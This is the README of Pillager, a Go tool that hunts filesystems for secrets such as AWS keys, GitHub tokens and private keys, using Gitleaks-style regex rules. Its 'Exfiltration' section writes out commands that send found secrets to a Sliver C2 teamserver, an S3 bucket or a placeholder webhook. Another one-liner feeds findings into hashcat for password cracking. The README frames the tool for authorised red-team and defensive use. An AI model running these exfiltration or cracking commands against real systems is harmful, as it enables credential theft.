# Pillager

<img src="./.github/logo.png" width="700">

[![Go Reference](https://pkg.go.dev/badge/github.com/brittonhayes/pillager.svg)](https://pkg.go.dev/github.com/brittonhayes/pillager)
![Latest Release](https://img.shields.io/github/v/release/brittonhayes/pillager?label=latest%20release)
[![Go Report Card](https://goreportcard.com/badge/github.com/brittonhayes/pillager)](https://goreportcard.com/report/github.com/brittonhayes/pillager)
![Tests](https://github.com/brittonhayes/pillager/workflows/test/badge.svg)

Pillage filesystems for sensitive information with Go.

## Table of Contents

1. [Summary](#summary)
1. [Installation](#installation)
1. [Usage](#usage)
1. [Exfiltration](#exfiltration)
1. [Documentation](#documentation)

## Summary

Pillager is designed to provide a simple means of leveraging Go's strong concurrency model to recursively search
directories for sensitive information in files. Pillager does this by standing on the shoulders
of [a few giants](#shoulders-of-giants). Once pillager finds files that match the specified pattern, the file is scanned
using a series of concurrent workers that each take a line of the file from the job queue and hunt for sensitive pattern
matches. The available pattern filters can be defined in a pillager.toml file or you can use the default ruleset.

## Installation

### Go

If you have Go setup on your system, you can install Pillager with `go install`

```shell script
go install github.com/brittonhayes/pillager@latest
```

### Scoop (Windows)

```shell
scoop bucket add pillager https://github.com/brittonhayes/pillager-scoop.git
scoop install pillager
```

### Homebrew (OSX/Linux)

```shell script
brew tap brittonhayes/homebrew-pillager
brew install pillager
```

### Docker Image

```
docker run --rm -it ghcr.io/brittonhayes/pillager:latest hunt .
```

If you're looking for a binary, check the latest releases for the executable that matches your system

## Usage

To see all the commands available with `pillager`

```shell
# To see instructions for the entire application
pillager

# From any subcommand
pillager [cmd] --help
```

## User Interface

Pillager provides a terminal user interface built with [bubbletea](https://github.com/charmbracelet/bubbletea) if you'd like to scan for secrets interactively.

[![asciicast](https://asciinema.org/a/WISZMVvKsfbFkLLQIWBRotknU.svg)](https://asciinema.org/a/WISZMVvKsfbFkLLQIWBRotknU)

## Exfiltration

Send discovered secrets to remote destinations: **[Sliver C2](https://sliver.sh/)** (loot/credential stores), **S3/MinIO** (cloud storage), or **Webhooks** (custom HTTP endpoints).

```bash
# Sliver C2 - Send to teamserver with credential parsing
pillager hunt /target --exfil sliver \
  --sliver-config ~/.sliver-client/configs/operator.cfg

# S3/MinIO - Upload with encryption
pillager hunt /target --exfil s3 \
  --s3-bucket red-team-findings \
  --s3-endpoint https://minio.internal:9000 \
  --exfil-encrypt env:EXFIL_KEY

# Webhook - POST to custom endpoint
pillager hunt /target --exfil webhook \
  --webhook-url https://your-server.com/findings \
  --webhook-header "Authorization: Bearer token"
```

**Security**: AES-256-GCM encryption (`--exfil-encrypt`), TLS by default, automatic metadata (hostname, timestamp)

---

## Configuration

### Gitleaks Rules

Pillager provides full support for Gitleaks[^2] rules. This can either be passed
in with a rules[^1] section in your pillager.toml file, or you can use the default ruleset by leaving the config flag blank.

[^1]: [Gitleaks Rules Reference](https://github.com/zricethezav/gitleaks/blob/57f9bc83d169bea363f2990a4de334b54efc3d7d/config/gitleaks.toml)

```toml
# pillager.toml
# Basic configuration
verbose = false 
redact = false 

# Rules for secret detection
[[rules]]
description = "AWS Access Key"
id = "aws-access-key"
regex = '''(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}'''
tags = ["aws", "credentials"]

[[rules]]
description = "AWS Secret Key"
id = "aws-secret-key"
regex = '''(?i)aws(.{0,20})?(?-i)['\"][0-9a-zA-Z\/+]{40}['\"]'''
tags = ["aws", "credentials"]

[[rules]]
description = "GitHub Token"
id = "github-token"
regex = '''ghp_[0-9a-zA-Z]{36}'''
tags = ["github", "token"]

[[rules]]
description = "Private Key"
id = "private-key"
regex = '''-----BEGIN (?:RSA|OPENSSH|DSA|EC|PGP) PRIVATE KEY( BLOCK)?-----'''
tags = ["key", "private"]

# Allowlist configuration
[allowlist]
paths = [
    ".*/_test\\.go$",
    ".*/testdata/.*",
    ".*\\.md$",
    ".*/vendor/.*"
]
regexes = [
    "EXAMPLE_KEY",
    "DUMMY_SECRET"
] 
```

### Built-in Output Formats

Pillager has a series of built-in output formats available. Pick your flavor!

#### Basic

```shell
pillager hunt .
```

#### JSON

```shell
pillager hunt ./example -f json | jq
```

> _JSON output is designed to work seamlessly with the amazing [jq](https://github.com/stedolan/jq) utility for easy parsing._

#### Wordlist

```shell
# Use pillager to generate a new-line delimited wordlist from findings
pillager hunt . -f wordlist 
```

```shell
# Use pillager to append a wordlist and then use your favorite hashcat attack mode
pillager hunt ./ -f wordlist >> rockyou.txt && hashcat -a 0 hash.txt rockyou.txt
```

<details>
<summary>Click to view more output formats</summary>
<br>

#### JSON Pretty

```shell
pillager hunt . -f json-pretty
```

#### HTML

```shell
pillager hunt . -f html > results.html
```

#### Markdown

```shell
pillager hunt . -f markdown > results.md
```

#### CSV 

```shell
pillager hunt . -f csv > results.csv
```

#### Custom Go Template

```shell
pillager hunt . --template "{{ range .}}Secret: {{.Secret}}{{end}}"
```

#### Custom Go Template from File

```shell
pillager hunt . -t "$(cat mytemplate.tmpl)"
```

</details>

### Custom Templates

Pillager allows you to use powerful `go text/template` and [sprig](https://masterminds.github.io/sprig/) functions to customize the output format. Here are a few template examples.

#### Basic

```gotemplate
{{ range . -}}
    File: {{ .File }}
    Secret: {{ .Secret}}
    Description: {{ quote .Description }}
{{ end -}}

```

#### Markdown Styling

```gotemplate
# Results

{{ range . -}}
    ## {{ .File }}
    - Location: {{.StartLine}}
{{end}}

```

> More template examples can be found in the [templates](./internal/templates) directory.

## Documentation

GoDoc documentation is available on [pkg.go.dev for pillager](https://pkg.go.dev/github.com/brittonhayes/pillager). 

## Development

To get involved developing features and fixes for Pillager, get started with the following:

- [Install Go](https://go.dev/doc/install)
- Install [Taskfile.dev](https://taskfile.dev/#/installation)
- Read the [CONTRIBUTING.MD](./CONTRIBUTING.md)

---

### Shoulders of Giants :star:

#### [spf13's Cobra](https://github.com/spf13/cobra)

**What is Cobra?**

> Cobra is a library providing a simple interface to create powerful modern CLI interfaces similar to git & go tools.
> Cobra is also an application that will generate your application scaffolding to rapidly develop a Cobra-based application.

If you've seen a CLI written in Go before, there's a pretty high chance it was built with Cobra. I can't recommend this
library enough. It empowers developers to make consistent, dynamic, and self-documenting command line tools with ease.
Some examples include `kubectl`, `hugo`, and Github's `gh` CLI.

#### [Gitleaks](https://github.com/gitleaks/gitleaks)

**What is Gitleaks?**

> Gitleaks[^2] is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.

Gitleaks is an amazing tool for secret leak prevention. If you haven't implemented Gitleaks as a pre-commit checker,
it's worth your time to check it out.

**Why is Gitleaks relevant to Pillager?**

[^2]: [Gitleaks](https://github.com/gitleaks/gitleaks)

Pillager implements the powerful [rules](https://github.com/gitleaks/gitleaks#rules-summary) functionality of
Gitleaks while taking a different approach to presenting and handling the secrets found. While I have provided a
baseline set of default rules, Pillager becomes much more powerful if you allow users to create rules for their own
use-cases.

Check out the included rules[^1] for a baseline ruleset.

---

> This goes without saying but I'm going to say it anyways: I am **not** responsible for any repercussions caused by your use of pillager.
> This tool is intended for defensive use, educational use, and security researcher use with the consent of all involved parties.
> Malicious behavior with pillager is in no way condoned, nor encouraged. Please use this tool responsibly and ensure you have permission
> to scan for secrets on any systems before doing so.
>
> At it's core, Pillager is designed to assist you in determining if a system is affected by common sources of credential leakage as documented
> by the MITRE ATT&CK[^3] framework.
>
> [^3]: [MITRE ATT&CK Website](https://attack.mitre.org)
>
> [MITRE ATT&CK Technique - T1552,003 - Unsecured Credentials: Bash History ](https://attack.mitre.org/techniques/T1552/003/)
>
> [MITRE ATT&CK Technique - T1552,001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
